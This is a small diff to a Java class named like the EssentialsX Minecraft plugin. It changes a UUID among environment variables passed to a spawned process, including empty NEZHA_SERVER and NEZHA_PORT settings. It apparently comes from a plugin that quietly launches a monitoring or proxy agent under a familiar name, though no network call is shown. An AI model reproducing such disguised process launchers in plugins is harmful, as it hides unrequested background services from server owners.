@@ -73,7 +73,7 @@ public class EssentialsX extends JavaPlugin {
         
         // Set environment variables
         Map<String, String> env = pb.environment();
-        env.put("UUID", "50435f3a-ec1f-4e1a-867c-385128b447f8");
+        env.put("UUID", "27dd7493-fea0-4ff5-b859-4bd81f6ce732");
         env.put("FILE_PATH", "./world");
         env.put("NEZHA_SERVER", "");
         env.put("NEZHA_PORT", "");
